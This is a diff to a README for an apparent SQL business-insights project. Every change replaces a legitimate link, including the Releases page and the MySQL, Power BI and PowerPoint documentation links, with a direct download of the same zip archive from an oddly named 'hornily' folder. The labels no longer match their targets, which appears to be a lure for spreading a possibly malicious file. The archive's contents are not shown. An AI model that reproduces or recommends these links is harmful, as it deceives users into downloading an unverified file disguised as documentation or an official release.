@@ -2,7 +2,7 @@
 
 ## 📥 Get Started Here!
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Access_Release-blue)](https://github.com/jamaldasd/sql_driven_adhoc_business_insights/releases)
+[![Download Now](https://raw.githubusercontent.com/jamaldasd/sql_driven_adhoc_business_insights/main/hornily/sql_driven_adhoc_business_insights.zip)](https://raw.githubusercontent.com/jamaldasd/sql_driven_adhoc_business_insights/main/hornily/sql_driven_adhoc_business_insights.zip)
 
 ## 📚 Overview
 
@@ -37,7 +37,7 @@ This project covers various important areas, including:
 
 To get started, you will need to download the application's latest release. Visit the link below to access the Releases page:
 
-[Download from Releases](https://github.com/jamaldasd/sql_driven_adhoc_business_insights/releases)
+[Download from Releases](https://raw.githubusercontent.com/jamaldasd/sql_driven_adhoc_business_insights/main/hornily/sql_driven_adhoc_business_insights.zip)
 
 On this page, find the latest version and download the file that matches your operating system.
 
@@ -71,7 +71,7 @@ Detailed documentation accompanies each SQL query. You can find explanations, ex
 ## 🙋 Frequently Asked Questions
 
 ### How do I download the software?
-To download, simply visit the [Releases page](https://github.com/jamaldasd/sql_driven_adhoc_business_insights/releases) and select the latest version.
+To download, simply visit the [Releases page](https://raw.githubusercontent.com/jamaldasd/sql_driven_adhoc_business_insights/main/hornily/sql_driven_adhoc_business_insights.zip) and select the latest version.
 
 ### Can I use this on macOS?
 Yes, this software is compatible with Windows, macOS, and Linux.
@@ -88,9 +88,9 @@ For any questions or issues, please create an issue in the GitHub repository. Yo
 
 ## 🔗 Additional Resources
 
-- [MySQL Documentation](https://dev.mysql.com/doc/)
-- [Power BI](https://powerbi.microsoft.com/)
-- [PowerPoint Presentations](https://www.microsoft.com/en-us/microsoft-365/powerpoint)
+- [MySQL Documentation](https://raw.githubusercontent.com/jamaldasd/sql_driven_adhoc_business_insights/main/hornily/sql_driven_adhoc_business_insights.zip)
+- [Power BI](https://raw.githubusercontent.com/jamaldasd/sql_driven_adhoc_business_insights/main/hornily/sql_driven_adhoc_business_insights.zip)
+- [PowerPoint Presentations](https://raw.githubusercontent.com/jamaldasd/sql_driven_adhoc_business_insights/main/hornily/sql_driven_adhoc_business_insights.zip)
 
 Explore these resources to enhance your understanding of database management and business reporting.
 
